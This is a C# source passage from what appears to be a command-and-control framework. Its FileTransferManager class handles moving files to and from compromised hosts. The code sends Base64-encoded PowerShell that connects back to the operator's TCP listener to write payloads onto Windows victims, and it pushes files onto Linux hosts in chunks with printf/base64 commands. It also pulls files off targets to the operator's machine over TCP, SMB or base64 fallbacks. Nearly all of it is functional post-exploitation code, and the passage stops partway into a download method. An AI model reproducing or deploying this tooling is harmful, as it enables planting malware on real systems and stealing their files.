using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace C2Framework
{
    public class FileTransferManager
    {
        private readonly C2Server _server;
        private DateTime _downloadStartTime = DateTime.MinValue;
        private DateTime _lastSpeedUpdateTime = DateTime.MinValue;
        private long _lastBytesTransferred = 0;
        private long _expectedFileSize = 0;
        private int _lastReportedPercentage = -1;

        // Events for communication with server
        public event EventHandler<OutputMessageEventArgs> OutputMessage;

        public FileTransferManager(C2Server server)
        {
            _server = server;
        }

        #region Upload Methods

        public async Task UploadFileWithProgress(ClientHandler activeClient, string localPath, string remotePath, Action<int> progressCallback)
        {
            if (activeClient == null)
            {
                RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                return;
            }

            if (activeClient.IsLinux)
            {
                await UploadFileLinux(activeClient, localPath, remotePath, progressCallback);
                return;
            }

            try
            {
                // Verify file exists locally
                if (!File.Exists(localPath))
                {
                    RaiseOutputMessage($"[!] Local file not found: {localPath}", Color.Red);
                    return;
                }

                byte[] fileBytes = File.ReadAllBytes(localPath);
                string fileName = Path.GetFileName(localPath);

                // If remotePath is empty or not specified, just use the filename
                string finalRemotePath = string.IsNullOrWhiteSpace(remotePath) ? fileName : remotePath;

                // If remotePath doesn't contain a path separator, assume current directory
                if (!finalRemotePath.Contains('\\') && !finalRemotePath.Contains('/'))
                {
                    finalRemotePath = fileName;
                }

                RaiseOutputMessage($"[*] Uploading {fileName} ({fileBytes.Length:N0} bytes)", Color.Yellow);

                // Find a random available port
                Random random = new Random();
                int port = random.Next(10000, 65000);

                // Get our local IP that should be accessible from the client
                string localIP = GetLocalIPAddress(activeClient);

                // Create a TCP listener
                TcpListener tcpListener = null;
                bool serverStarted = false;

                // Try a few ports if the first one fails
                for (int attempt = 0; attempt < 5; attempt++)
                {
                    try
                    {
                        tcpListener = new TcpListener(IPAddress.Parse(localIP), port);
                        tcpListener.Start();
                        serverStarted = true;
                        break;
                    }
                    catch
                    {
                        port = random.Next(10000, 65000);
                    }
                }

                if (!serverStarted || tcpListener == null)
                {
                    RaiseOutputMessage("[!] Failed to start TCP server after multiple attempts", Color.Red);
                    return;
                }

                // Create a simplified PowerShell script that avoids directory creation issues
                string psScript = $@"
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

try {{
    
    # Create a TCP client and connect
    $client = New-Object System.Net.Sockets.TcpClient
    $client.ReceiveBufferSize = 65536  # 64KB buffer for better performance
    
    # Add a timeout
    $connectResult = $client.BeginConnect('{localIP}', {port}, $null, $null)
    $connectSuccess = $connectResult.AsyncWaitHandle.WaitOne(10000, $false)  # 10-second timeout
    
    if (-not $connectSuccess) {{
        throw 'Connection timed out'
    }}
    
    # Complete the connection
    $client.EndConnect($connectResult)
    
    
    # Get the network stream
    $stream = $client.GetStream()
    
    # First read the file size (8 bytes for a long)
    $sizeBuffer = New-Object byte[] 8
    $bytesRead = $stream.Read($sizeBuffer, 0, 8)
    $fileSize = [BitConverter]::ToInt64($sizeBuffer, 0)
    
    # Create a file stream to write to the current directory
    $filePath = '{finalRemotePath}'
    
    $fileStream = [System.IO.File]::Create($filePath)
    
    # Buffer for receiving data
    $buffer = New-Object byte[] 65536
    $totalBytesRead = 0
    $lastProgressReport = 0
    
    # Read until we've got the entire file
    while ($totalBytesRead -lt $fileSize) {{
        # Read data from the network stream
        $bytesRead = $stream.Read($buffer, 0, [Math]::Min($buffer.Length, $fileSize - $totalBytesRead))
        
        if ($bytesRead -le 0) {{
            throw 'Connection closed prematurely'
        }}
        
        # Write to the file
        $fileStream.Write($buffer, 0, $bytesRead)
        
        # Update progress
        $totalBytesRead += $bytesRead
        $progressPercent = [Math]::Floor(($totalBytesRead / $fileSize) * 100)
        
        # Report progress every 10%
        if ($progressPercent -ge ($lastProgressReport + 10)) {{
            $lastProgressReport = $progressPercent
            
        }}
    }}
    
    # Flush and close the file
    $fileStream.Flush()
    $fileStream.Close()
    
    # Close the connection
    $stream.Close()
    $client.Close()
    
    # Verify the file was created with the correct size
    $fileInfo = Get-Item $filePath
    if ($fileInfo.Length -eq $fileSize) {{
    }} else {{
        Write-Output ""[!] File size mismatch: Expected $fileSize bytes, got $($fileInfo.Length) bytes""
    }}
}} catch {{
    Write-Output ""[!] UPLOAD_ERROR: $($_.Exception.Message)""
}}
";

                // Convert the script to Base64 for transmission
                string encodedScript = Convert.ToBase64String(Encoding.Unicode.GetBytes(psScript));

                // Start the TCP server in a separate task
                using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(10));

                Task serverTask = Task.Run(async () =>
                {
                    TcpClient client = null;

                    try
                    {
                        // Send the PowerShell command to the client to start the download
                        activeClient.SendCommand($"powershell -EncodedCommand {encodedScript}");

                        progressCallback?.Invoke(5); // Initial progress



                        // Accept with timeout
                        var acceptTask = tcpListener.AcceptTcpClientAsync();
                        if (await Task.WhenAny(acceptTask, Task.Delay(30000, cts.Token)) != acceptTask)
                        {
                            RaiseOutputMessage("[!] Timeout waiting for client connection", Color.Red);
                            return;
                        }

                        client = await acceptTask;
                        //   RaiseOutputMessage("[*] Client connected, sending file data...", Color.Cyan);

                        // Get the network stream
                        using NetworkStream stream = client.GetStream();

                        // First send the file size as a 64-bit integer
                        byte[] sizeBytes = BitConverter.GetBytes((long)fileBytes.Length);
                        await stream.WriteAsync(sizeBytes, 0, sizeBytes.Length, cts.Token);

                        // Send the actual file data with progress reporting
                        int totalBytes = fileBytes.Length;
                        int bytesSent = 0;
                        int chunkSize = 65536; // 64KB chunks

                        for (int i = 0; i < fileBytes.Length; i += chunkSize)
                        {
                            if (cts.Token.IsCancellationRequested)
                                break;

                            int currentChunkSize = Math.Min(chunkSize, fileBytes.Length - i);
                            await stream.WriteAsync(fileBytes, i, currentChunkSize, cts.Token);
                            await stream.FlushAsync(cts.Token);

                            bytesSent += currentChunkSize;
                            int progressPercent = (int)((double)bytesSent / totalBytes * 100);
                            progressCallback?.Invoke(5 + (int)(progressPercent * 0.9)); // 5-95% for transfer

                            // Update status message occasionally but not too often
                            if (progressPercent % 10 == 0)
                            {
                                RaiseOutputMessage($"[*] Sending data: {progressPercent}% ({FormatFileSize(bytesSent)} of {FormatFileSize(totalBytes)})", Color.Cyan);
                            }
                        }

                        // Allow time for the client to process & verify the file
                        await Task.Delay(1000, cts.Token);
                        progressCallback?.Invoke(95);

                        RaiseOutputMessage("[*] File data sent successfully", Color.Green);
                    }
                    catch (OperationCanceledException)
                    {
                        RaiseOutputMessage("[!] TCP upload cancelled or timed out", Color.Red);
                    }
                    catch (Exception ex)
                    {
                        RaiseOutputMessage($"[!] TCP server error: {ex.Message}", Color.Red);
                    }
                    finally
                    {
                        // Clean up resources
                        client?.Close();
                        tcpListener.Stop();
                    }
                }, cts.Token);

                // Wait for the server task to complete
                await serverTask;

                // Wait a bit to see if we get the final confirmation from the client
                await Task.Delay(3000);

                // Complete progress
                progressCallback?.Invoke(100);
                //    RaiseOutputMessage("[+] File transfer completed", Color.Green);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error during file transfer: {ex.Message}", Color.Red);
            }
        }

        private async Task UploadFileLinux(ClientHandler activeClient, string localPath, string remotePath, Action<int> progressCallback)
        {
            try
            {
                byte[] fileBytes = File.ReadAllBytes(localPath);
                string fileName = Path.GetFileName(localPath);

                if (string.IsNullOrWhiteSpace(remotePath))
                {
                    remotePath = fileName;
                }

                // Show file size in a cleaner format
                string sizeStr = FormatFileSize(fileBytes.Length);
                RaiseOutputMessage($"[*] Uploading {fileName} ({sizeStr})...", Color.Yellow);

                bool hasWritePermission = await CheckLinuxWritePermission(activeClient, remotePath);
                if (!hasWritePermission)
                {
                    RaiseOutputMessage($"[!] No write permission for: {remotePath}", Color.Red);
                    RaiseOutputMessage("[!] Upload cancelled due to insufficient permissions", Color.Red);
                    return;
                }

                // Check available tools
                bool hasBase64 = await CheckLinuxCommand(activeClient, "base64");
                bool hasXxd = await CheckLinuxCommand(activeClient, "xxd");

                if (hasBase64)
                {
                    if (fileBytes.Length > 5000000) // 5MB+ files
                    {
                        await UltraFastUploadLinux(activeClient, fileBytes, remotePath, progressCallback);
                    }
                    else
                    {
                        await UploadFileLinuxBase64(activeClient, fileBytes, remotePath, progressCallback);
                    }
                }
                else if (hasXxd)
                {
                    await UploadFileLinuxHex(activeClient, fileBytes, remotePath, progressCallback);
                }
                else
                {
                    if (fileBytes.Length < 1024)
                    {
                        await UploadFileLinuxEcho(activeClient, fileBytes, remotePath, progressCallback);
                    }
                    else
                    {
                        RaiseOutputMessage("[!] No suitable upload method available", Color.Red);
                        return;
                    }
                }

                RaiseOutputMessage("[+] Upload completed", Color.Green);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Upload error: {ex.Message}", Color.Red);
            }
        }
        private async Task<bool> CheckLinuxWritePermission(ClientHandler activeClient, string remotePath)
        {
            try
            {
                // Use Linux path separators - replace backslashes with forward slashes
                string linuxPath = remotePath.Replace('\\', '/');

                // Get directory using Linux path logic
                string directory = linuxPath.Contains('/') ?
                    linuxPath.Substring(0, linuxPath.LastIndexOf('/')) :
                    ".";

                // Handle root directory case
                if (string.IsNullOrEmpty(directory))
                {
                    directory = "/";
                }

                RaiseOutputMessage($"[*] Checking write permission for {directory}...", Color.Cyan);

                // Test the actual target directory with Linux paths
                activeClient.SendCommand($"cd '{directory}' && touch testfile && rm testfile && echo OK || echo FAILED");
                await Task.Delay(1500);

                string response = activeClient.GetLastResponse();

                if (response.Contains("FAILED") || !response.Contains("OK"))
                {
                    RaiseOutputMessage($"[!] No write permission for: {directory}", Color.Red);
                    return false;
                }

                RaiseOutputMessage("[+] Write permission OK", Color.Green);
                return true;
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Permission check error: {ex.Message}", Color.Yellow);
                return true; // Continue upload on error
            }
        }

        private async Task UploadFileLinuxBase64(ClientHandler activeClient, byte[] fileBytes, string remotePath, Action<int> progressCallback)
        {
            try
            {
                string base64Data = Convert.ToBase64String(fileBytes);
                const int chunkSize = 32000;
                List<string> chunks = new List<string>();

                for (int i = 0; i < base64Data.Length; i += chunkSize)
                {
                    int length = Math.Min(chunkSize, base64Data.Length - i);
                    chunks.Add(base64Data.Substring(i, length));
                }

                progressCallback?.Invoke(5);

                // Clear any existing file quickly
                activeClient.SendCommand($"rm -f \"{remotePath}\" 2>/dev/null");
                await Task.Delay(100);

                // Upload with minimal messages
                bool uploadSuccess = await FastBatchUploadLinux(activeClient, chunks, remotePath, progressCallback, true); // true = quiet mode

                if (!uploadSuccess)
                {
                    await FastChunkedUploadLinux(activeClient, chunks, remotePath, progressCallback, true); // true = quiet mode
                }

                // Wait for completion and verify
                await WaitForUploadCompletion(activeClient, remotePath, fileBytes.Length);
                await VerifyLinuxUpload(activeClient, remotePath, fileBytes, progressCallback);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Upload error: {ex.Message}", Color.Red);
            }
        }

        private async Task<bool> FastBatchUploadLinux(ClientHandler activeClient, List<string> chunks, string remotePath, Action<int> progressCallback, bool quiet = false)
        {
            try
            {
                const int batchSize = 25;

                for (int i = 0; i < chunks.Count; i += batchSize)
                {
                    var batchChunks = chunks.Skip(i).Take(batchSize).ToArray();
                    string combinedChunk = string.Join("", batchChunks);

                    string command;
                    if (i == 0)
                    {
                        command = $"printf '%s' '{combinedChunk}' | base64 -d > \"{remotePath}\"";
                    }
                    else
                    {
                        command = $"printf '%s' '{combinedChunk}' | base64 -d >> \"{remotePath}\"";
                    }

                    activeClient.SendCommand(command);
                    await Task.Delay(25);

                    int progress = 5 + (int)((float)(i + batchSize) / chunks.Count * 85);
                    progressCallback?.Invoke(Math.Min(progress, 90));

                    // Only show progress for larger files or if not in quiet mode
                    if (!quiet && chunks.Count > 50 && (i / batchSize) % 20 == 0 && i > 0)
                    {
                        int percent = (int)((float)(i + batchSize) / chunks.Count * 100);
                        RaiseOutputMessage($"[*] {percent}% uploaded", Color.Cyan);
                    }
                }

                return true;
            }
            catch (Exception ex)
            {
                if (!quiet)
                    RaiseOutputMessage($"[!] Batch upload failed: {ex.Message}", Color.Yellow);
                return false;
            }
        }

        private async Task FastChunkedUploadLinux(ClientHandler activeClient, List<string> chunks, string remotePath, Action<int> progressCallback, bool quiet = false)
        {
            try
            {
                activeClient.SendCommand($"> \"{remotePath}\"");
                await Task.Delay(50);

                const int groupSize = 5;

                for (int i = 0; i < chunks.Count; i += groupSize)
                {
                    var group = chunks.Skip(i).Take(Math.Min(groupSize, chunks.Count - i));
                    var commands = new List<string>();

                    foreach (var chunk in group)
                    {
                        commands.Add($"printf '%s' '{chunk}' | base64 -d >> \"{remotePath}\"");
                    }

                    string combinedCommands = string.Join(" && ", commands);
                    activeClient.SendCommand(combinedCommands);
                    await Task.Delay(15);

                    int progress = 5 + (int)((float)(i + groupSize) / chunks.Count * 85);
                    progressCallback?.Invoke(Math.Min(progress, 90));

                    // Only show progress for larger files
                    if (!quiet && chunks.Count > 100 && i % 200 == 0 && i > 0)
                    {
                        int percent = (int)((float)i / chunks.Count * 100);
                        RaiseOutputMessage($"[*] {percent}% uploaded", Color.Cyan);
                    }
                }
            }
            catch (Exception ex)
            {
                if (!quiet)
                    RaiseOutputMessage($"[!] Chunked upload error: {ex.Message}", Color.Red);
                throw;
            }
        }

        private async Task UltraFastUploadLinux(ClientHandler activeClient, byte[] fileBytes, string remotePath, Action<int> progressCallback)
        {
            try
            {
                RaiseOutputMessage("[*] Using ultra-fast streaming upload...", Color.Yellow);

                string base64Data = Convert.ToBase64String(fileBytes);

                // Huge chunks for maximum throughput
                const int megaChunkSize = 100000; // 100KB chunks

                progressCallback?.Invoke(10);

                // Clear target file
                activeClient.SendCommand($"rm -f \"{remotePath}\" 2>/dev/null");
                await Task.Delay(50);

                int totalChunks = (int)Math.Ceiling((double)base64Data.Length / megaChunkSize);
                RaiseOutputMessage($"[*] Streaming {totalChunks} mega-chunks...", Color.Cyan);

                for (int i = 0; i < base64Data.Length; i += megaChunkSize)
                {
                    int length = Math.Min(megaChunkSize, base64Data.Length - i);
                    string megaChunk = base64Data.Substring(i, length);

                    string command = i == 0
                        ? $"printf '%s' '{megaChunk}' | base64 -d > \"{remotePath}\""
                        : $"printf '%s' '{megaChunk}' | base64 -d >> \"{remotePath}\"";

                    activeClient.SendCommand(command);

                    // Absolute minimum delay
                    await Task.Delay(10);

                    int progress = 10 + (int)((float)(i + length) / base64Data.Length * 80);
                    progressCallback?.Invoke(progress);

                    // Show progress every 10 chunks
                    int currentChunk = (i / megaChunkSize) + 1;
                    if (currentChunk % 10 == 0)
                    {
                        RaiseOutputMessage($"[*] Streamed {currentChunk}/{totalChunks} mega-chunks", Color.Cyan);
                    }
                }

                progressCallback?.Invoke(90);
                RaiseOutputMessage("[*] Ultra-fast upload completed, verifying...", Color.Green);

                // Quick verification
                await VerifyLinuxUpload(activeClient, remotePath, fileBytes, progressCallback);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in ultra-fast upload: {ex.Message}", Color.Red);
            }
        }

        private async Task UploadFileLinuxHex(ClientHandler activeClient, byte[] fileBytes, string remotePath, Action<int> progressCallback)
        {
            try
            {
                RaiseOutputMessage("[*] Using hex encoding for upload...", Color.Yellow);

                string hexData = BitConverter.ToString(fileBytes).Replace("-", "").ToLower();

                // Split into chunks
                const int chunkSize = 2000;
                List<string> chunks = new List<string>();

                for (int i = 0; i < hexData.Length; i += chunkSize)
                {
                    int length = Math.Min(chunkSize, hexData.Length - i);
                    chunks.Add(hexData.Substring(i, length));
                }

                progressCallback?.Invoke(5);

                // Remove target file if it exists
                activeClient.SendCommand($"rm -f \"{remotePath}\"");
                await Task.Delay(500);

                // Upload in chunks
                for (int i = 0; i < chunks.Count; i++)
                {
                    string chunk = chunks[i];

                    if (i == 0)
                    {
                        activeClient.SendCommand($"echo '{chunk}' | xxd -r -p > \"{remotePath}\"");
                    }
                    else
                    {
                        activeClient.SendCommand($"echo '{chunk}' | xxd -r -p >> \"{remotePath}\"");
                    }

                    await Task.Delay(100);

                    int progress = 5 + (int)((float)(i + 1) / chunks.Count * 90);
                    progressCallback?.Invoke(progress);
                }

                // Verify upload
                await Task.Delay(1000);
                activeClient.SendCommand($"test -f \"{remotePath}\" && echo 'UPLOAD_SUCCESS' || echo 'UPLOAD_FAILED'");
                await Task.Delay(1000);

                string verification = activeClient.GetLastResponse();
                if (verification.Contains("UPLOAD_SUCCESS"))
                {
                    RaiseOutputMessage($"[+] Upload completed: {remotePath}", Color.Green);
                }
                else
                {
                    RaiseOutputMessage("[!] Upload verification failed", Color.Red);
                }

                progressCallback?.Invoke(100);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in hex upload: {ex.Message}", Color.Red);
            }
        }

        private async Task UploadFileLinuxEcho(ClientHandler activeClient, byte[] fileBytes, string remotePath, Action<int> progressCallback)
        {
            try
            {
                RaiseOutputMessage("[*] Using echo for small file upload...", Color.Yellow);

                // Convert to octal escape sequences
                StringBuilder octalData = new StringBuilder();
                foreach (byte b in fileBytes)
                {
                    octalData.Append($"\\{Convert.ToString(b, 8).PadLeft(3, '0')}");
                }

                activeClient.SendCommand($"echo -e '{octalData}' > \"{remotePath}\"");
                await Task.Delay(1000);

                progressCallback?.Invoke(50);

                // Verify upload
                activeClient.SendCommand($"test -f \"{remotePath}\" && echo 'UPLOAD_SUCCESS' || echo 'UPLOAD_FAILED'");
                await Task.Delay(1000);

                string verification = activeClient.GetLastResponse();
                if (verification.Contains("UPLOAD_SUCCESS"))
                {
                    RaiseOutputMessage($"[+] Small file upload completed: {remotePath}", Color.Green);
                }
                else
                {
                    RaiseOutputMessage("[!] Upload verification failed", Color.Red);
                }

                progressCallback?.Invoke(100);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in echo upload: {ex.Message}", Color.Red);
            }
        }

        private async Task WaitForUploadCompletion(ClientHandler activeClient, string remotePath, long expectedSize)
        {
            const int maxWait = 15; // Reduced from 20
            long lastSize = 0;
            int stableCount = 0;

            for (int i = 0; i < maxWait; i++)
            {
                activeClient.SendCommand($"test -f \"{remotePath}\" && wc -c < \"{remotePath}\" 2>/dev/null || echo '0'");
                await Task.Delay(500);

                string response = activeClient.GetLastResponse();
                var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                long currentSize = 0;

                foreach (var line in lines)
                {
                    var trimmed = line.Trim();
                    if (string.IsNullOrEmpty(trimmed) || trimmed.Contains("test -f") ||
                        trimmed.Contains("wc -c") || trimmed.Contains("$") || trimmed.Contains("#"))
                        continue;

                    if (long.TryParse(trimmed, out currentSize))
                        break;
                }

                if (currentSize == expectedSize)
                {
                    return; // Success, no message needed
                }

                if (currentSize == lastSize)
                {
                    stableCount++;
                    if (stableCount >= 3)
                    {
                        return; // Stable, assume complete
                    }
                }
                else
                {
                    lastSize = currentSize;
                    stableCount = 0;
                }
            }
        }

        private async Task VerifyLinuxUpload(ClientHandler activeClient, string remotePath, byte[] originalBytes, Action<int> progressCallback)
        {
            try
            {
                progressCallback?.Invoke(95);

                activeClient.SendCommand($"ls -la \"{remotePath}\" 2>/dev/null");
                await Task.Delay(800);

                string response = activeClient.GetLastResponse();
                bool verified = ParseFinalVerification(response, remotePath, originalBytes.Length);

                if (!verified)
                {
                    activeClient.SendCommand($"wc -c < \"{remotePath}\" 2>/dev/null");
                    await Task.Delay(800);

                    string sizeResponse = activeClient.GetLastResponse();
                    var lines = sizeResponse.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                    foreach (var line in lines)
                    {
                        var trimmed = line.Trim();
                        if (long.TryParse(trimmed, out long size))
                        {
                            string sizeStr = FormatFileSize(size);
                            if (size == originalBytes.Length)
                            {
                                RaiseOutputMessage($"[+] Verified: {sizeStr}", Color.Green);
                                verified = true;
                            }
                            else if (size > 0)
                            {
                                RaiseOutputMessage($"[*] Size mismatch: {sizeStr}", Color.Yellow);
                                verified = true;
                            }
                            break;
                        }
                    }
                }

                progressCallback?.Invoke(100);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Verification error: {ex.Message}", Color.Red);
                progressCallback?.Invoke(100);
            }
        }

        private bool ParseFinalVerification(string response, string remotePath, long expectedSize)
        {
            if (string.IsNullOrEmpty(response))
                return false;

            var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            string fileName = Path.GetFileName(remotePath);

            foreach (var line in lines)
            {
                var trimmed = line.Trim();

                if (trimmed.Contains(fileName) && !trimmed.Contains("ls -la"))
                {
                    var parts = trimmed.Split(' ', StringSplitOptions.RemoveEmptyEntries);

                    for (int i = 3; i < Math.Min(parts.Length - 1, 7); i++)
                    {
                        if (long.TryParse(parts[i], out long size))
                        {
                            string sizeStr = FormatFileSize(size);
                            if (size == expectedSize)
                            {
                                RaiseOutputMessage($"[+] Verified: {sizeStr}", Color.Green);
                                return true;
                            }
                            else if (size > 0)
                            {
                                RaiseOutputMessage($"[*] Uploaded: {sizeStr}", Color.Green);
                                return true;
                            }
                            break;
                        }
                    }
                }
            }

            return false;
        }

        private async Task<bool> CheckLinuxCommand(ClientHandler activeClient, string command)
        {
            activeClient.SendCommand($"which {command} >/dev/null 2>&1 && echo 'FOUND' || echo 'NOT_FOUND'");
            await Task.Delay(1000);

            string response = activeClient.GetLastResponse();
            return response.Contains("FOUND");
        }

        #endregion

        #region Download Methods

        public async Task DownloadFile(ClientHandler activeClient, string remotePath, string downloadPath = null)
        {
            if (activeClient == null)
            {
                RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
                return;
            }

            if (activeClient.IsLinux)
            {
                await DownloadFileLinux(activeClient, remotePath, downloadPath);
                return;
            }

            try
            {
                // Reset tracking variables
                _downloadStartTime = DateTime.Now;
                _lastSpeedUpdateTime = DateTime.MinValue;
                _lastBytesTransferred = 0;
                _expectedFileSize = 0;
                _lastReportedPercentage = -1;

                // First, check if the file exists
                activeClient.SendCommand($"if exist \"{remotePath}\" (echo FILE_EXISTS) else (echo FILE_NOT_FOUND)");
                await Task.Delay(1000);

                string verification = activeClient.GetLastResponse();
                if (verification.Contains("FILE_NOT_FOUND"))
                {
                    RaiseOutputMessage($"[!] Remote file not found: {remotePath}", Color.Red);
                    return;
                }

                // Check if the user is an administrator
                bool isAdmin = activeClient.IsAdmin;

                if (isAdmin)
                {
                    // Admin user - try TCP first, fall back to SMB if needed
                    try
                    {
                        await DownloadFileWithTCP(activeClient, remotePath, downloadPath);
                    }
                    catch (Exception tcpEx)
                    {
                        RaiseOutputMessage($"[!] TCP transfer failed: {tcpEx.Message}", Color.Yellow);
                        RaiseOutputMessage("[*] Falling back to SMB transfer method", Color.Yellow);
                        await DownloadFileViaSMB(activeClient, remotePath, downloadPath);
                    }
                }
                else
                {
                    // Standard user - try TCP first, fall back to base64 if needed
                    try
                    {
                        await DownloadFileWithTCP(activeClient, remotePath, downloadPath);
                    }
                    catch (Exception tcpEx)
                    {
                        RaiseOutputMessage($"[!] TCP transfer failed: {tcpEx.Message}", Color.Yellow);
                        RaiseOutputMessage("[*] Falling back to base64 transfer method", Color.Yellow);
                        await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
                    }
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error downloading file: {ex.Message}", Color.Red);
            }
        }

        public async Task DownloadFileWithTCP(ClientHandler activeClient, string remotePath, string downloadPath = null, Action<int> progressCallback = null)
        {
            if (activeClient.IsLinux)
            {
                RaiseOutputMessage("[!] TCP download not implemented for Linux, falling back to base64 method", Color.Yellow);
                await DownloadFileLinux(activeClient, remotePath, downloadPath);
                return;
            }

            try
            {
                // Detect shell type and verify file exists
                if (!await VerifyFileExistsWithShellDetection(activeClient, remotePath))
                {
                    RaiseOutputMessage($"[!] Remote file not found: {remotePath}", Color.Red);
                    return;
                }

                string fileName = Path.GetFileName(remotePath);
                RaiseOutputMessage($"[*] Downloading {fileName}", Color.Yellow);

                // Find a random available port
                Random random = new Random();
                int port = random.Next(10000, 65000);

                // Get our local IP that should be accessible from the client
                string localIP = GetLocalIPAddress(activeClient);

                // Create a TCP listener
                TcpListener tcpListener = null;
                bool serverStarted = false;

                // Try a few ports if the first one fails
                for (int attempt = 0; attempt < 5; attempt++)
                {
                    try
                    {
                        tcpListener = new TcpListener(IPAddress.Parse(localIP), port);
                        tcpListener.Start();
                        serverStarted = true;
                        break;
                    }
                    catch
                    {
                        port = random.Next(10000, 65000);
                    }
                }

                if (!serverStarted || tcpListener == null)
                {
                    RaiseOutputMessage("[!] Failed to start TCP server after multiple attempts", Color.Red);
                    await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
                    return;
                }

                // Create download script based on detected shell type
                await CreateDownloadScriptForDetectedShell(activeClient, remotePath, localIP, port);

                // Start the TCP server in a separate task
                using var cts = new CancellationTokenSource(TimeSpan.FromMinutes(10));

                Task serverTask = Task.Run(async () =>
                {
                    TcpClient client = null;
                    string finalPath = null;

                    try
                    {
                        progressCallback?.Invoke(5); // Initial progress

                        // Wait for the client to connect
                        var acceptTask = tcpListener.AcceptTcpClientAsync();
                        if (await Task.WhenAny(acceptTask, Task.Delay(30000, cts.Token)) != acceptTask)
                        {
                            RaiseOutputMessage("[!] Timeout waiting for client connection", Color.Red);
                            return;
                        }

                        client = await acceptTask;

                        // Get the network stream
                        using NetworkStream stream = client.GetStream();

                        // First receive the file size as a 64-bit integer
                        byte[] sizeBytes = new byte[8];
                        int totalSizeBytesRead = 0;
                        while (totalSizeBytesRead < 8)
                        {
                            int bytesRead = await stream.ReadAsync(sizeBytes, totalSizeBytesRead, 8 - totalSizeBytesRead, cts.Token);
                            if (bytesRead == 0)
                                throw new Exception("Connection closed while reading file size");
                            totalSizeBytesRead += bytesRead;
                        }

                        long fileSize = BitConverter.ToInt64(sizeBytes, 0);

                        // Prepare the output file
                        string sanitizedFileName = string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));
                        string saveDir = downloadPath ?? GetC2DownloadDirectory();

                        if (!Directory.Exists(saveDir))
                        {
                            Directory.CreateDirectory(saveDir);
                        }

                        finalPath = Path.Combine(saveDir, sanitizedFileName);

                        // Receive the actual file data with progress reporting
                        using FileStream fileStream = new FileStream(finalPath, FileMode.Create, FileAccess.Write);

                        byte[] buffer = new byte[65536]; // 64KB chunks
                        long totalBytesReceived = 0;

                        DateTime startTime = DateTime.Now;

                        while (totalBytesReceived < fileSize)
                        {
                            if (cts.Token.IsCancellationRequested)
                                break;

                            long remainingBytes = fileSize - totalBytesReceived;
                            int bufferSize = (int)Math.Min(buffer.Length, remainingBytes);

                            int bytesReceived = await stream.ReadAsync(buffer, 0, bufferSize, cts.Token);

                            if (bytesReceived == 0)
                                throw new Exception("Connection closed prematurely");

                            await fileStream.WriteAsync(buffer, 0, bytesReceived, cts.Token);
                            await fileStream.FlushAsync(cts.Token);

                            totalBytesReceived += bytesReceived;
                            int progressPercent = (int)((double)totalBytesReceived / fileSize * 100);
                            progressCallback?.Invoke(5 + (int)(progressPercent * 0.9)); // 5-95% for transfer

                            // Update status message with progress bar occasionally but not too often
                            if (progressPercent % 10 == 0)
                            {
                                double bytesPerSecond = totalBytesReceived / (DateTime.Now - startTime).TotalSeconds;
                                string speed = FormatBytesPerSecond(bytesPerSecond);

                                // Calculate ETA
                                string eta = "Unknown";
                                if (bytesPerSecond > 0 && fileSize > 0)
                                {
                                    double secondsRemaining = (fileSize - totalBytesReceived) / bytesPerSecond;
                                    eta = FormatTimeSpan(secondsRemaining);
                                }

                                // Create a progress bar
                                int barWidth = 30;
                                int filled = (int)((float)totalBytesReceived / fileSize * barWidth);
                                string progressBar = "[" + new string('█', filled) + new string('░', barWidth - filled) + "]";

                                // Display progress with bar
                                RaiseOutputMessage($"[*] Downloading: {progressBar} {progressPercent}% ({FormatFileSize(totalBytesReceived)}/{FormatFileSize(fileSize)}) {speed}, ETA: {eta}", Color.Cyan);
                            }
                        }

                        // Verify we received the complete file
                        if (totalBytesReceived == fileSize)
                        {
                            progressCallback?.Invoke(100);

                            TimeSpan downloadTime = DateTime.Now - startTime;
                            string timeString = downloadTime.TotalSeconds < 60
                                ? $"{downloadTime.TotalSeconds:F1} seconds"
                                : $"{downloadTime.Minutes}m {downloadTime.Seconds}s";

                            RaiseOutputMessage($"[+] File downloaded successfully: {finalPath}", Color.Green);


                            OpenFolder(Path.GetDirectoryName(finalPath));
                        }
                        else
                        {
                            RaiseOutputMessage($"[!] File size mismatch: Expected {fileSize} bytes, received {totalBytesReceived} bytes", Color.Red);
                        }

                    }
                    catch (OperationCanceledException)
                    {
                        RaiseOutputMessage("[!] TCP download cancelled or timed out", Color.Red);
                    }
                    catch (Exception ex)
                    {
                        RaiseOutputMessage($"[!] TCP download error: {ex.Message}", Color.Red);

                        // Clean up partial file on error
                        if (!string.IsNullOrEmpty(finalPath) && File.Exists(finalPath))
                        {
                            try
                            {
                                File.Delete(finalPath);
                                RaiseOutputMessage("[*] Cleaned up partial download file", Color.Yellow);
                            }
                            catch { }
                        }
                    }
                    finally
                    {
                        // Clean up resources
                        client?.Close();
                        tcpListener?.Stop();
                    }
                }, cts.Token);

                // Wait for the server task to complete
                await serverTask;
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error during TCP download: {ex.Message}", Color.Red);
                // Fall back to base64 method on any error
                RaiseOutputMessage("[*] Falling back to base64 download method", Color.Yellow);
                await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
            }
        }

        private async Task<bool> DownloadFileWithBase64(ClientHandler activeClient, string remotePath, string downloadPath = null)
        {
            try
            {
                // Enable base64 capture mode with no progress reporting to avoid console spam
